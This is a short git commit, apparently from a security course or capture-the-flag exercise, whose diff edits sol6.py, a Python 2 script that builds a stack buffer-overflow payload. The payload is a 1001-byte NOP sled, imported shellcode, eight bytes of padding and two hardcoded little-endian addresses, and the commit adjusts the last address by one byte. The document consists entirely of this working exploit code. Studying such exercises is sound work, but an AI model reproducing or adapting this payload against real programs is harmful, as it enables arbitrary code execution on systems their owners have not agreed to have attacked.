4cf3d5bc32fd79a060d56f9242f16bd6f6a0e1c0
ubuntu <ubuntu@ubuntu.(none)>
2013-11-13 02:04:50 -0500

    blah blah

--- sol6.py
+++ sol6.py
@@ -1,4 +1,4 @@
 from struct import pack
 import os,sys
 from shellcode import shellcode
-print "\x90" * 1001 + shellcode + "\x41" * 8 + pack("<I", 0xbffea158) + pack("<I", 0xbffe9e20)
+print "\x90" * 1001 + shellcode + "\x41" * 8 + pack("<I", 0xbffea158) + pack("<I", 0xbffe9e21)
